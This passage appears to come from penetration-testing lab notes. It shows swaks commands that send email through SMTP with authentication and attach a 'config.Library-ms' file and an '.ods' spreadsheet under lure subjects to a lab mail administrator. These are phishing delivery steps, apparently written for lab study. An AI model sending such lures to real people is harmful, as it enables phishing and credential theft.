+> --attach config.Library-ms --server <SMTP_SERVER> --body body.txt \
+> --header "Subject: Problems" --suppress-data \
+> --auth LOGIN --auth-user <username> --auth-password <password>
+>
+>     Purpose: sends an email with SMTP authentication using a username and password.
+>
+>     Additional Parameters:
+>         --auth LOGIN: Specifies authentication type.
+>         --auth-user: Username for the SMTP server.
+>         --auth-password: Password for the SMTP server.
+- ### Example
+> ```bash
+> sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.131.XXX --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
+> ```
+
+--- 
+
